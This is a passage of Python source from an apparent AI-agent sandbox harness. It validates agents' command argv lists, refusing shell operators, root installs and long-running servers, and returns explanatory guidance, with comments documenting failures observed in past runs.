            f"it changes how `{executable}` itself runs rather than doing "
            "anything in the workspace. Send the plain command without it."
        )
    # Named as a throwaway, because what is named so is swept before the next
    # test round and at release (`file_kinds.is_scratch`). "Remove it" was
    # followed for a few: one run left twelve `tmp-*` probes and one
    # `src/import-ui.mjs`, and only the last - named like the product - would
    # have shipped.
    return (
        "it can execute arbitrary code. Put the code in a file inside the "
        "project folder named `tmp-<what it checks>` with the language's own "
        "extension, and run the file. A file named so is a throwaway the "
        "harness removes before the next test round and at release, so it "
        "never ships; any other name is taken for part of the product."
        + _what_that_snippet_was_reading(argv, repo_root)
    )


def validate_command(
    command: Sequence[str], role_name: str, repo_root: str | Path | None = None
) -> list[str]:
    """Return the validated argv, or raise CommandNotAllowed."""
    if isinstance(command, str):
        raise CommandNotAllowed(
            "Commands must be given as a list of arguments, e.g. [\"npm\", \"install\"]. "
            "A single string would require a shell, which is not available."
        )
    argv = [str(part) for part in command]
    if not argv:
        raise CommandNotAllowed("Command cannot be empty.")

    executable = os.path.basename(argv[0])

    permitted = allowed_executables(role_name, repo_root)
    if executable not in permitted:
        # A whole command line packed into the first element is not a missing
        # permission, and saying so sends the agent looking for the wrong fix.
        # Measured on one run: `["wc -l", "todo-app/style.css"]` was
        # answered with "'wc -l' is not permitted ... Allowed: ..., wc, ..." -
        # a refusal that lists the very program it is refusing. Three calls
        # went that way across two roles.
        first_word = os.path.basename(argv[0].split()[0]) if argv[0].split() else ""
        if len(argv[0].split()) > 1 and first_word in permitted:
            rest = argv[0].split()[1:]
            corrected = [first_word, *rest, *argv[1:]]
            raise CommandNotAllowed(
                f"'{argv[0]}' is one string holding a program and its arguments. "
                "There is no shell here, so nothing splits it: the first item of "
                "`command` must be the program name on its own, with every "
                "argument as its own item. "
                f"'{first_word}' is permitted - send {corrected!r}."
            )
        raise CommandNotAllowed(
            f"'{executable}' is not permitted for role '{role_name}'."
            f"{_what_to_do_instead(executable)} "
            f"{_what_can_actually_run(permitted)}"
        )

    forbidden = _FORBIDDEN_ARGS.get(executable, frozenset())
    for index, arg in enumerate(argv[1:], start=1):
        if arg in forbidden:
            raise CommandNotAllowed(
                f"'{executable} {arg}' is not permitted: "
                + _what_to_do_with_that_argument(executable, argv, repo_root, permitted)
            )
        if arg == "-m" and executable in {"python", "python3"}:
            module = argv[index + 1] if index + 1 < len(argv) else ""
            if module not in _ALLOWED_PYTHON_MODULES:
                raise CommandNotAllowed(
                    f"'{executable} -m {module}' is not permitted: it can execute arbitrary code. "
                    f"Allowed modules: {', '.join(sorted(_ALLOWED_PYTHON_MODULES))}."
                )

    operator = _uses_a_shell_operator(argv)
    if operator is not None:
        raise CommandNotAllowed(
            f"'{operator}' is a shell operator and there is no shell here, so it "
            f"would be passed to '{os.path.basename(argv[0])}' as an ordinary "
            "argument. The command would run, exit successfully and not do what "
            "you meant - a redirect writes no file, a pipe feeds nothing. "
            "To create or change a file use write_artifact or edit_artifact; to "
            "use the output of one command in another, run them separately and "
            "read the result."
        )

    code_to_check = _code_given_to_node_check(argv)
    if code_to_check is not None:
        raise CommandNotAllowed(code_to_check)

    unparseable = _checks_a_file_node_cannot_parse(argv)
    if unparseable is not None:
        raise CommandNotAllowed(
            f"`node --check` cannot read '{unparseable}': node decides how to parse "
            "a file from its extension and only handles .js, .mjs and .cjs, so this "
            "fails before it reads the file and will fail however the file is "
            "edited. There is no syntax checker for this kind of file in this "
            "environment - read it back with read_file if you want to confirm what "
            "it contains."
        )

    directory = _a_directory_given_to_node_test(argv, repo_root)
    if directory is not None:
        base = directory.rstrip("/").removeprefix("./")
        pattern = "**/*.test.js" if base in {"", "."} else f"{base}/**/*.test.js"
        corrected = [pattern if part == directory else part for part in argv]
        raise CommandNotAllowed(
            f"`node --test {directory}` runs no test on the Node here: it loads a "
            "directory argument as a module and fails before any test starts (\"Could "
            "not find\", ERR_UNSUPPORTED_DIR_IMPORT). Give it the test files, or a "
            f"pattern Node expands itself - send {corrected!r}. In a package.json "
            f"script, quote the pattern: `node --test '{pattern}'`."
        )

    root_install = _needs_root_the_sandbox_will_not_give(argv)
    if root_install is not None:
        raise CommandNotAllowed(root_install)

    server = _starts_a_server(argv) or _a_script_that_serves(argv, repo_root)
    if server:
        raise CommandNotAllowed(
            f"'{server}' is not permitted: it runs until it is stopped, and "
            "nothing here will stop it, so this call would sit until the "
            "timeout and return nothing."
            + _how_to_serve_the_page_instead(str(repo_root or ""))
        )
    return argv


#: Playwright subcommands that install *system* packages rather than browsers.
#: `install-deps` is the documented one; `install --with-deps` is the same thing
#: reached through a flag.
_ROOT_INSTALL_SUBCOMMANDS = frozenset({"install-deps"})


def _needs_root_the_sandbox_will_not_give(argv: list[str]) -> str | None:
    """Refuse a command whose only job is to `apt-get install` as root.

    Measured live on this deployment on 2026-09-21. `specialist_ui_ux_2` ran
    `npx playwright install-deps chromium` and got::

        Installing dependencies...
        Switching to root user to install dependencies...
        Failed to install browser dependencies
        Error: Installation process exited with code: 1
        stderr: Password: su: Authentication failure

    Three things are wrong with letting that through, and the third is the one
    that matters.

    It cannot succeed. The runtime image runs as `appuser` deliberately - the
    whole compose stack is written to avoid root - so a command that shells out
    to `su` will fail here every time, whatever the agent changes about it.

    It is not needed. The Dockerfile already installs the browser system
    libraries, for a reason it records: one run spent all three of its
    remediation attempts on "Playwright regression tests fail due to missing
    system library libglib-2.0.so.0". They are present; nothing is missing.

    And the error it returns points the wrong way. `su: Authentication failure`
    reads as a credentials problem, so an agent's next move is to try again with
    `sudo`, or to give up on browser tests entirely and delete the suite that
    was about to pass. The Playwright e2e tests in this very run went on to pass
    twenty assertions once the agent stopped trying to install dependencies it
    already had. A refusal that says so costs one tool call; the confusion costs
    a stage.

    `install` itself is untouched: it is a no-op against the image's cache,
    returns instantly, and refusing it would teach the agent to distrust a
    command that works.
    """
    parts = [os.path.basename(str(part)) for part in argv]
    if not any(part == "playwright" for part in parts):
        return None

    asks_for_deps = any(part in _ROOT_INSTALL_SUBCOMMANDS for part in parts) or (
        "install" in parts and "--with-deps" in parts
    )
    if not asks_for_deps:
        return None

    return (
        "`playwright install-deps` installs system packages as root, and this "
        "container runs as an unprivileged user - it will fail with "
        "`su: Authentication failure` however it is phrased, and that message is "
        "about `su`, not about anything you can fix.\n\n"
        "You do not need it. The browser and its system libraries are already in "
        "this image. Run your tests directly: `npx playwright test`. If a browser "
        "binary is genuinely missing, `npx playwright install chromium` is "
        "permitted and returns immediately against the image's cache."
    )


#: Commands whose whole purpose is to keep running. A static file server is
#: the one agents reach for: they want to "open the page", and there is no
#: browser here to open it with, so the server serves nobody until the timeout
#: kills it. Measured across the stored runs - every one of these is a 120s
#: wait that returned nothing:
#:
#:   One run  npx serve . -p 8000        specialist_testing_1
#:   one run  npx serve -p 8000          specialist_testing_1 (retried)
#:   one run  npx http-server -p 8765    specialist_ui_ux_0
#:   one run  npx --yes serve -p 3000    specialist_ui_ux_0 (retried)
#:
#: Half of all command timeouts on record. A refusal costs nothing and says
#: what to do instead; a timeout costs two minutes and says nothing. This is
#: the shape of the `node -e` refusal above, which works.
#: Words that name a long-running server, in any ecosystem.
#:
#: This was seven names, all JavaScript, plus two Python modules. Every other
#: way of starting a server - `rails server`, `flask run`, `uvicorn`,
#: `dotnet run`, `php -S`, `mix phx.server`, `ng serve` - ran until the
#: timeout and returned nothing, and the agent then retried it. That is the
#: pattern that cost one run, and the timeout scaling added on
#: 2026-09-19 makes it cost more: on a Rust or Java stack the same hang now
#: waits several times as long before saying anything.
#:
#: Matched on any argument rather than on argv[0], because these arrive as
#: `npx serve`, `python -m uvicorn`, `bundle exec rails server` - the server's
#: name is rarely the executable.
_SERVER_COMMANDS = frozenset(
    {
        # JavaScript and TypeScript.
        "serve", "http-server", "live-server", "browser-sync",
        "webpack-dev-server", "vite", "nodemon", "next", "nuxt", "astro",
        "remix", "ng", "parcel", "webpack", "turbo",
        # Python.
        "uvicorn", "gunicorn", "hypercorn", "daphne", "waitress-serve",
        "runserver", "flask", "fastapi",
        # Ruby.
        "rails", "puma", "unicorn", "thin", "webrick", "jekyll",
        # PHP, Elixir, Go, Rust, Java, .NET.
        "phx.server", "watch", "air", "realize",
        "spring-boot:run", "quarkus:dev", "bootRun",
        # Generic.
        "dev", "start",
    }
)

#: `python3 -m http.server`, the same idea reached through `-m`.
_SERVER_MODULES = frozenset({
    "http.server", "SimpleHTTPServer", "uvicorn", "gunicorn", "flask",
    "hypercorn", "waitress", "daphne",
})

#: Subcommands that make an otherwise-ambiguous executable a server. `rails`
#: alone might be `rails --version`; `rails server` is not. Keyed so that a
#: generic word like `dev` or `start` only counts after a runner that has one.
_SERVER_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "rails": frozenset({"server", "s"}),
    "flask": frozenset({"run"}),
    "php": frozenset({"-S"}),
    "dotnet": frozenset({"run", "watch"}),
    "mix": frozenset({"phx.server"}),
    "ng": frozenset({"serve"}),
    "npm": frozenset({"start", "dev"}),
    "yarn": frozenset({"start", "dev"}),
    "pnpm": frozenset({"start", "dev"}),
    "deno": frozenset({"task"}),
    "manage.py": frozenset({"runserver"}),
}


#: Extensions `node` will parse as JavaScript. Anything else makes it throw
#: ERR_UNKNOWN_FILE_EXTENSION before it reads a byte of the file.
_JAVASCRIPT_SUFFIXES = frozenset({".js", ".mjs", ".cjs"})


#: Shell operators that arrive as ordinary arguments because there is no shell.
#: Each one means the command does something other than what was intended, and
#: in the redirection cases it means the command quietly does nothing at all.
_SHELL_OPERATORS = frozenset({">", ">>", "<", "<<", "|", "||", "&&", ";", "&", "2>", "&>"})


def _uses_a_shell_operator(argv: Sequence[str]) -> str | None:
    """The shell operator in this argv, or None.

    `["echo", "export {};", ">", "app.js"]` runs `echo` with three arguments.
    It prints them, exits 0, and writes nothing - so the agent is told its
    command succeeded and believes the file exists.

    Measured on one run: `specialist_backend_2` did exactly that twice,
    for `app.js` and `simple-to-do-list-app/app.js`. Both "succeeded". Neither
    file was written.

    A silent no-op reported as success is the worst shape a tool result can
    have - the codebase has paid for it before, in a write that returned
    "edited" without editing and a read that digested the wrong string. This
    one arrives with an exit code of zero, which is the most convincing lie
    available.
    """
    for part in argv[1:]:
        if str(part).strip() in _SHELL_OPERATORS:
            return str(part).strip()
    return None


#: Characters a command-line code snippet has and a file path does not.
_CODE_NOT_A_PATH = re.compile(r"""[()'"`;{}]""")
_A_SCRIPT_IT_NAMES = re.compile(r"""['"`]((?:\.{1,2}/)?[\w./-]+\.(?:m|c)?js)['"`]""")


def _code_given_to_node_check(argv: Sequence[str]) -> str | None:
    """Why `node --check <code>` cannot work, or None when it names files.

    `--check` parses the file it is given. Measured on one run: a fix stage ran
    `node -c "require('./src/main.js')"`, and the refusal for a file node
    cannot parse answered - the "extension" of that snippet being `.js')` -
    that there is no syntax checker for this kind of file here. There is one,
    for the very file the snippet names.
    """
    parts = [str(part) for part in argv]
    if not parts or os.path.basename(parts[0]) != "node":
        return None
    if not any(p in {"--check", "-c"} for p in parts[1:]):
        return None
    code = next(
        (part for part in parts[1:] if not part.startswith("-") and _CODE_NOT_A_PATH.search(part)),
        None,
    )
    if code is None:
        return None
    named = _A_SCRIPT_IT_NAMES.search(code)
    instead = (
        f" To check '{named.group(1)}', send ['node', '--check', "
        f"'{os.path.normpath(named.group(1))}'] from the directory it is in."
        if named
        else " Send the path of the file to check."
    )
    return (
        f"`node --check` parses a file, and '{code}' is code, not a file's path: "
        f"node would look for a file of that name.{instead}"
    )


def _checks_a_file_node_cannot_parse(argv: Sequence[str]) -> str | None:
    """The non-JavaScript file this `node --check` would refuse, or None.

    `node --check style.css` fails with ERR_UNKNOWN_FILE_EXTENSION, and it
    fails for what the file *is*, not for what it contains - so no edit to the
    CSS, or to anything else, will ever make it pass. That puts it in the same
    class as a policy refusal rather than an ordinary failure, and the
    write-gated "you already tried this" note is silent on it by design.

    Measured on one run: `specialist_ui_ux_0` ran the identical
    `node --check task-manager/style.css` twice, two minutes apart, editing
    files in between - so the gate correctly saw a changed workspace and said
    nothing, twice, about a command that could not work either time.

    Checked on the extension rather than the error text, because node decides
    on the extension too.
    """
    parts = [str(part) for part in argv]
    if not parts or os.path.basename(parts[0]) != "node":
        return None
    if not any(p in {"--check", "-c"} for p in parts[1:]):
        return None
    for part in parts[1:]:
        if part.startswith("-"):
            continue
        suffix = os.path.splitext(part)[1].lower()
        if suffix and suffix not in _JAVASCRIPT_SUFFIXES:
            return part
    return None


#: `node` flags whose value follows as the next argument, so it is not a path.
_NODE_FLAGS_WITH_A_VALUE = frozenset({
    "--test-reporter", "--test-reporter-destination", "--test-name-pattern",
    "--test-skip-pattern", "--test-concurrency", "--test-timeout", "--test-shard",
    "--test-coverage-include", "--test-coverage-exclude", "--import", "--require",
    "-r", "--loader", "--experimental-loader", "--env-file", "--conditions", "-C",
})


def _a_directory_given_to_node_test(argv: Sequence[str], repo_root: str | Path | None) -> str | None:
    """The directory this `node --test` is given, or None.

    Node 20 searched a directory argument for test files. The Node here does
    not: measured in the run image on Node 24.21, `node --test ./` stops at
    "Could not find './'", and `node --test tests/` loads the directory as a
    module and reports one failed test, ERR_UNSUPPORTED_DIR_IMPORT - none of
    the suite's own tests run, however they are written. The harness's own
    packs named `tests/` until the image moved on, and each failed its smoke
    test that way.

    A trailing `/`, `.`, or a name with no extension that is a directory in
    the workspace or the project. A pattern (`tests/**/*.test.js`) is what
    Node expands itself, and a flag's value is not a path.
    """
    parts = [str(part) for part in argv]
    if not parts or os.path.basename(parts[0]) != "node" or "--test" not in parts[1:]:
        return None
    after = parts[parts.index("--test") + 1 :]
    skip = False
    for part in after:
        if skip:
            skip = False
            continue
        if part.startswith("-"):
            skip = part in _NODE_FLAGS_WITH_A_VALUE
            continue
        if re.search(r"[*?\[{]", part):
            continue
        if part.endswith("/") or part in {".", ".."}:
            return part
        if os.path.splitext(part)[1] or repo_root is None:
            continue
        root = Path(repo_root)
        candidates = [root / part]
        try:
            project = (root / ".project-directory").read_text(encoding="utf-8").strip()
        except OSError:
            project = ""
        if project:
            candidates.append(root / project / part)
        if any(candidate.is_dir() for candidate in candidates):
            return part
    return None


def _how_to_serve_the_page_instead(repo_root: str) -> str:
    """What to do with a page in this workspace, given what it has installed.

    The refusal above is right that a foreground server would sit until the
    timeout. Its second half was wrong wherever it mattered most: "There is
    also no browser to open the page with. To check the page, read the files
    and assert on them from a test."

    Both halves are false in a workspace with Playwright, which is the
    workspace the harness's own checks push every UI product toward. Measured
    on one run: `npx serve -p 3000 --cors` was refused with that sentence
    sixteen times, while the same run's `playwright.config.ts` carried
    `webServer: { command: 'npx serve .' }`, started it, logged "Accepting
    connections at http://localhost:3000" and ran 34 browser tests with real
    passes and failures. The same program, in the same container, refused to
    the agent and granted to the test runner.

    The advice was worse than the false fact. "Read the files and assert on
    them from a test" describes the hand-built DOM that `a_dom_built_by_hand`
    notes and `_refuse_a_hand_built_dom_again` refuses - one part of the
    harness telling a stage to do what another part stops it doing.

    A project a stack pack scaffolded has that configuration already, kept by
    the harness: telling a stage to write one sent one run's stages back to the
    refused command 101 times. There, the answer is the pack's own command.
    """
    try:
        from app.stacks.contract import read as the_contract

        record = the_contract(repo_root)
    except Exception:  # noqa: BLE001 - no contract, no pack-specific answer
        record = None
    if record:
        command = " ".join(str(part) for part in record.get("acceptance_test") or [])
        project = record.get("project") or "the project directory"
        evidence = record.get("evidence_dir") or ""
        return (
            f" This project's acceptance configuration already starts the product: "
            f"`{command}` in `{project}/` serves it, runs the tests against it and stops "
            f"it again. To look at one criterion, run it alone - "
            f"`{command} -- -g \"AC-3\"` - and read what it prints"
            + (f"; a screenshot of every test is kept under `{project}/{evidence}/`" if evidence else "")
            + ". Starting the server yourself is refused every time, so do not try again."
        )
    if _any_manifest_declares_a_browser_runner(repo_root):
        return (
            " A browser runner is installed here and browsers do run: start "
            "the server from Playwright instead of from this tool, with "
            "`webServer: { command: '...', url: '...' }` in "
            "`playwright.config.ts`. Playwright starts it, waits for the url, "
            "runs the tests against it and stops it afterwards, which is the "
            "one shape of this that finishes. Do not replace the browser test "
            "with a hand-written `global.document`; that is refused elsewhere."
        )
    return (
        " There is no browser here to open the page with either. To check the "
        "page, import the module and call it from a test - or install a "
        "browser runner (`npm install -D @playwright/test`) and let its "
        "`webServer` start the server for you, which is the supported way to "
        "serve a page in this sandbox."
    )


#: Programs that look something up and exit. No argument can make one of these
#: run forever, so a server's name among their arguments is a subject, not a
#: command - `which serve` asks where `serve` is, it does not start it.
#:
#: `tail` is deliberately absent: `tail -f` does run until it is stopped.
_ONLY_INSPECTS = frozenset({
    "which", "type", "whereis", "command", "ls", "cat", "head", "grep", "egrep",
    "fgrep", "rg", "find", "wc", "stat", "file", "echo", "test", "diff", "cmp",
    "sort", "uniq", "basename", "dirname", "realpath", "readlink", "du", "df",
    "tree", "pwd", "printenv", "env",
})

#: Runners that execute whatever follows them, so the program to judge is the
#: next word rather than the runner. `npx which serve` is still an inspection.
_DELEGATES_TO_THE_NEXT_WORD = frozenset({"npx", "bunx", "pnpx", "dlx", "exec"})


def _the_program_this_would_run(parts: Sequence[str]) -> str:
    """The program a command actually runs, past any delegating runner."""
    for part in parts:
        if part in _DELEGATES_TO_THE_NEXT_WORD or part.startswith("-"):
            continue
        if part in {"npm", "pnpm", "yarn", "bun"}:
            continue
        return part
    return parts[0] if parts else ""


#: Interpreters that run a script file named as their first argument.
_RUNS_A_SCRIPT = frozenset({"node", "python", "python3", "deno", "bun", "tsx", "ts-node"})

#: What starting an HTTP listener looks like inside a script, across the
#: languages the stack packs build in.
_SERVES = re.compile(
    r"createServer\s*\(|\.listen\s*\(\s*(?:\d|port|PORT|process\.env)|serve_forever\s*\("
    r"|uvicorn\.run\s*\(|HTTPServer\s*\(|Deno\.serve\s*\(|Bun\.serve\s*\(|\bapp\.run\s*\("
)


def _a_script_that_serves(argv: Sequence[str], repo_root: str | Path | None) -> str | None:
    """The script this command runs, when that script starts a server; else None.

    `_starts_a_server` knows server commands by name. A server can also be a
    plain script - `node scripts/serve.mjs` - which looks like any other
    program until it is read. One run's QA stage started a stack pack's own
    static server this way and the call sat until its timeout; the pack's
    acceptance configuration starts that server itself.
    """
    parts = [str(part) for part in argv]
    if not parts or os.path.basename(parts[0]) not in _RUNS_A_SCRIPT or "--test" in parts:
        return None
    script = next((part for part in parts[1:] if not part.startswith("-")), None)
    if not script or not repo_root:
        return None
    # A test may start a server and close it again; running it is not serving.
    if re.search(r"(?:^|[._/-])(?:test|tests|spec)(?:[._/-]|$)", script, re.I):
        return None
    root = Path(repo_root)
    candidates = [root / script, *(child / script for child in root.iterdir() if child.is_dir())] if root.is_dir() else []
    for candidate in candidates:
        try:
            if candidate.is_file() and _SERVES.search(candidate.read_text(encoding="utf-8", errors="replace")[:200_000]):
                return script
        except OSError:
            continue
    return None


def _starts_a_server(argv: Sequence[str]) -> str | None:
    """The name of the server this command would start, or None.

    Matched on the argument rather than the executable because these arrive as
    `npx serve` and `npx --yes serve`, never as `serve` alone.

    That is why a program whose whole job is to look something up needed
    excluding. Measured on the stored runs: `which serve` and
    `ls -la node_modules/serve` were both refused with "it runs until it is
    stopped, and nothing here will stop it" - said about a path lookup and a
    directory listing. `grep serve package.json` and `npx which serve` do the
    same. The install carve-out below is the same shape of mistake, found
    earlier; this is the other half of it.
    """
    parts = [os.path.basename(str(part)) for part in argv]
    if _the_program_this_would_run(parts) in _ONLY_INSPECTS:
        return None
    # Installing a server is not running one. `npm install -D serve` names
    # `serve` as the package to add, and every word-matching check here sees
    # a server.
    #
    # Measured live on one run: `specialist_backend_2` was refused
    # `npm install -D serve` twice, told "it runs until it is stopped, and
    # nothing here will stop it" about a command that would have exited in
    # seconds. `serve` has been in this list since before it was widened, so
    # the false positive is older than the widening - it simply had no
    # install grammar to check against until now.
    if _a_package_this_command_would_add(argv):
        return None
    # `<runner> <subcommand>` first: it is the unambiguous form, and it lets
    # a generic word like `start` count only behind a runner that has one.
    for index, part in enumerate(parts[:-1]):
        wanted = _SERVER_SUBCOMMANDS.get(part)
        if wanted and parts[index + 1] in wanted:
            return f"{part} {parts[index + 1]}"
    for index, part in enumerate(parts):
        if part in _SERVER_MODULES and "-m" in parts[:index]:
            return part
        if part not in _SERVER_COMMANDS:
            continue
        # A program `_SERVER_SUBCOMMANDS` names is a server only with one of
        # those subcommands, which the loop above has already checked. Caught
        # here by its name alone, `rails test`, `ng test` and `flask db
        # upgrade` were refused as servers - a pack's own unit test command
        # among them.
        if part in _SERVER_SUBCOMMANDS:
            continue
        # A generic word is only a server behind something that takes one;
        # `npm run dev` reaches here as `dev` and is caught above, while a
        # file called `start` is not a server.
        if part in {"dev", "start", "watch"} and index == 0:
            continue
        # `vite build` and `webpack-dev-server --help` terminate; only the bare
        # invocation and an explicit `dev`/`start`/`serve` keep running.
        following = parts[index + 1 :]
        if any(f in {"build", "--help", "-h", "--version", "-v"} for f in following):
            return None
        return part
    return None


#: What to say when a command hits the wall. "Command timed out" alone tells an
#: agent nothing about why, and the commonest cause is not slowness: it is a
#: command that was never going to exit. `_SERVER_COMMANDS` refuses the ones
#: that can be recognised by name, but one run's ui specialist wrote its
#: own - `node serve-test.mjs` - and no name check can catch that.
#:
#: It used to say "there is no browser to open a page with" and "to check a page,
#: read the file and assert on its contents". Both were false wherever a browser
#: runner could be installed - which is here - and the second describes the
#: hand-built DOM another check refuses. The commonest cause it never named was
#: a test runner that watches by default: one run's `npm test` was `vitest`, ran
#: the full 300 seconds, and the fix was two words, `vitest run`. Named here
#: without naming any runner, because every ecosystem has one of these.
_TIMEOUT_ADVICE = (
    " A command that does not finish is usually one that was not meant to: a "
    "server, a watcher, or something waiting on input that will never come. "
    "A test runner that watches for changes by default never exits on its own: "
    "check the script this command runs, and use the runner's run-once mode. A "
    "server a test needs belongs in the test runner's own configuration, which "
    "starts and stops it. To check logic, import it and call it. If the command "
    "really is just slow, run the smaller part of it."
)

#: The same advice for a workspace that HAS a browser runner. The text above
#: is false there, and it was being sent to the stages most likely to need the
#: truth.
#:
#: Measured on one run. `npx playwright test` timed out and was answered
#: with "there is no browser to open a page with ... To check a page, read the
#: file and assert on its contents from a test". Seven minutes later
#: `npx playwright test --project=Desktop` ran 34 tests in this same sandbox,
#: with real passes and real failures. Browsers work here; the suite had been
#: run whole, with its web server starting, against a 120-second limit.
#:
#: The advice it replaces is worse than merely wrong. "Read the file and assert
#: on its contents from a test" is a description of the hand-built DOM that
#: `a_dom_built_by_hand` refuses, so the harness was telling a stage to do the
#: thing another part of the harness would stop it doing.
_TIMEOUT_ADVICE_WITH_A_BROWSER = (
    " A command that does not finish is usually one that was not meant to: a "
    "server, a watcher, or something waiting on input that will never come. "
    "This project has a browser runner installed and browsers do run here, so "
    "the likely causes are different: the whole suite run at once against this "
    "limit, or a `webServer` that never came up. Run a smaller part of it - one "
    "project (`--project=...`), one spec file, or `--reporter=line` - and check "
    "the server command separately. Do not replace the browser test with a "
    "hand-written `global.document`: that is refused elsewhere, and for good "
    "reason."
)


def _declares_a_browser_runner(manifest: Path) -> bool:
    """Whether one `package.json` brings a browser runner with it."""
    try:
        import json as _json

        declared = _json.loads(manifest.read_text(encoding="utf-8"))
    except Exception:  # noqa: BLE001 - an unreadable manifest declares nothing
        return False
    packages = {
        **(declared.get("dependencies") or {}),
        **(declared.get("devDependencies") or {}),
    }
    return "@playwright/test" in packages or "playwright" in packages


def _any_manifest_declares_a_browser_runner(repo_root: str) -> bool:
    """The same question with no working directory to start the walk from.

    `validate_command` has the workspace root and nothing else, and the
    manifest is almost never at the root - every run so far has put the
    product in a subdirectory of its own. Two levels is enough for that and
    keeps this off `node_modules`.
    """
    if not repo_root:
        # `Path("")` is the current working directory, which is the harness's
        # own checkout, not a workspace. A caller with no root knows nothing
        # about the product, and guessing from the process's cwd would answer
        # a question about the wrong repository.
        return False
    try:
        root = Path(repo_root)
        if not root.is_dir():
            return False
        for manifest in (root / "package.json", *root.glob("*/package.json")):
            if manifest.is_file() and _declares_a_browser_runner(manifest):
                return True
    except Exception:  # noqa: BLE001 - never fail a refusal over a manifest
        return False
    return False


def _a_browser_runner_is_installed(repo_root: str, working_directory: str | None) -> bool:
    """Whether this workspace has Playwright to drive, as opposed to advice.

    Read from the manifests rather than from the command, so it is true for
    the `npm test` that wraps a Playwright run as well as for a direct one.
    """
    if not working_directory:
        return _any_manifest_declares_a_browser_runner(repo_root)
    try:
        import json as _json

        root = Path(repo_root)
        # `_execute_here` passes an absolute `run_in`; the tool layer passes a
        # path relative to the workspace. `Path.__truediv__` takes an absolute
        # right-hand side as the whole answer, so one line covers both.
        start = (root / working_directory) if working_directory else root
        start = start.resolve()
        for folder in (start, *start.parents):
            manifest = folder / "package.json"
            if not manifest.is_file():
                if root not in folder.parents and folder != root:
                    break
                continue
            declared = _json.loads(manifest.read_text(encoding="utf-8"))
            packages = {
                **(declared.get("dependencies") or {}),
                **(declared.get("devDependencies") or {}),
            }
            if "@playwright/test" in packages or "playwright" in packages:
                return True
            if folder == root:
                break
    except Exception:  # noqa: BLE001 - never fail a timeout message over a manifest
        return False
    return False


#: For an install that ran out of time. Servers, watchers and browser suites -
#: what the other two describe - are not what an install is.
_INSTALL_TIMEOUT_ADVICE = (
    " This was a package install. An install that runs past the limit is a slow "
    "registry or a large dependency tree, not a command that never ends: run it "
    "once more, or install fewer packages per command. Nothing was changed by "
    "the part that did not finish."
)


#: How runtimes report a program or file as missing, each capturing the path.
#: `spawn /bin/sh ENOENT` is how Node reports a child whose working directory
#: does not exist - it names the program, not the directory.
_REPORTED_MISSING = (
    re.compile(r"spawn (/[\w./+-]+) ENOENT"),
    re.compile(r"No such file or directory:? '?(/[\w./+-]+)'?"),
    re.compile(r"(/[\w./+-]+): (?:No such file or directory|not found)"),
)


def _a_missing_path_that_is_here(outcome: dict) -> str:
    """A note when the output calls a path missing that exists here, or "".

    One run's `specialist_backend_2` ran its browser tests and got
    `Error: Failed to launch: Error: spawn /bin/sh ENOENT`. It concluded "this
    container lacks /bin/sh, which is required for Playwright", and deleted
    the end-to-end suite, its config and its server. `/bin/sh` was there. The
    config it had just edited gave the web server `cwd: 'simple-todo-list'`,
    resolved against a config already inside `simple-todo-list/`, and a child
    started in a directory that does not exist is reported by the name of the
    program it was starting.
    """
    text = f"{outcome.get('stdout') or ''}\n{outcome.get('stderr') or ''}\n{outcome.get('error') or ''}"
    for pattern in _REPORTED_MISSING:
        for match in pattern.finditer(text):
            path = match.group(1).rstrip(".,:;")
            try:
                present = Path(path).exists()
            except OSError:
                present = False
            if present:
                return (
                    f"'{path}' exists in this environment. An error that names it as "
                    "missing is about something else it was started with - most often "
                    "a working directory that does not exist, such as a path given "
                    "relative to the wrong folder in a command or a configuration "
                    "file. Check every directory the command and its configuration "
                    "name before concluding that a tool is unavailable here."
                )
    return ""


#: A relative path an error reports as missing, in the spellings runtimes use:
#: Node's `ENOENT: no such file or directory, open './x'` and `Cannot find
#: module 'x'`, Python's `No such file or directory: 'x'`, and the shell's
#: `x: No such file or directory`. Absolute paths are `_REPORTED_MISSING`'s.
_A_RELATIVE_PATH_MISSING = (
    re.compile(r"no such file or directory,? (?:open|stat|scandir|lstat)? ?'((?!/)[\w./@+-]+)'", re.I),
    re.compile(r"No such file or directory:? '((?!/)[\w./@+-]+)'"),
    re.compile(r"Cannot find module '((?!/)[\w./@+-]*[./][\w./@+-]+)'"),
    re.compile(r"(?m)^(?:[\w-]+: )?((?!/)[\w./@+-]+\.[\w]+): (?:No such file or directory|not found)"),
)


def _a_relative_path_missing_from_where_it_ran(
    outcome: dict, repo_root: str | Path, working_directory: str | None
) -> str:
    """A note when a relative path is missing from where the command ran, or "".

    A relative path in a command, or in a file the command reads, resolves from
    the directory the command runs in - not from the file that names it. One
    run's `specialist_ui_ux_0` wrote `todo-list/validate.mjs` reading
    `./style.css` and ran it from the workspace root, then from `todo-list`
    with the script named from the root, then flipped the path between
    `./style.css` and `todo-list/style.css` four times: ENOENT every time, a
    dozen calls, and each error named only the path, never the directory it
    was looked for in. The harness knows both, and where the file is.

    Only when exactly one workspace file ends with the reported path, so the
    note never guesses between two.
    """
    text = f"{outcome.get('stdout') or ''}\n{outcome.get('stderr') or ''}"
    if not text.strip():
        return ""
    try:
        root = Path(repo_root).resolve()
        ran_in = (root / (working_directory or "")).resolve()
    except OSError:
        return ""
    for pattern in _A_RELATIVE_PATH_MISSING:
        for match in pattern.finditer(text):
            wanted = match.group(1).rstrip(".,:;")
            while wanted.startswith("./"):
                wanted = wanted[2:]
            if not wanted or wanted.startswith("../") or (ran_in / wanted).exists():
                continue
            name = wanted.rsplit("/", 1)[-1]
            try:
                found = [
                    candidate.relative_to(root).as_posix()
                    for candidate in files_under(root, NOT_SEARCHED_FOR_A_STAGE, name)
                    if candidate.is_file()
                    and candidate.relative_to(root).as_posix().endswith(wanted)
                ]
            except Exception:  # noqa: BLE001 - a note must never fail a command
                return ""
            if len(found) != 1:
                continue
            here = found[0]
            base = here[: -len(wanted)].rstrip("/")
            where = f"'{working_directory}'" if working_directory else "the workspace root"
            instead = f"working_directory '{base}'" if base else "no working_directory"
            return (
                f"'{match.group(1)}' was looked for in the directory this command ran "
                f"in, {where}, and is not there. It is at '{here}'. A relative path - "
                "in the command or in a file the command reads - resolves from the "
                "working directory, not from the file that names it. Run with "
                f"{instead} and name every other path relative to that, or change the "
                "path to be relative to where it runs."
            )
    return ""


def _timeout_advice(
    repo_root: str, working_directory: str | None, command: Sequence[str] = ()
) -> str:
    """Which of the advice above this command and workspace have earned.

    The browser advice is about a test run - "the whole suite run at once ...
    or a `webServer` that never came up" - so it goes only to a command that
    runs tests. One run's testing specialist started its own `node server.js`,
    which never exits, and was told "the likely causes are different" from the
    server its command was.
    """
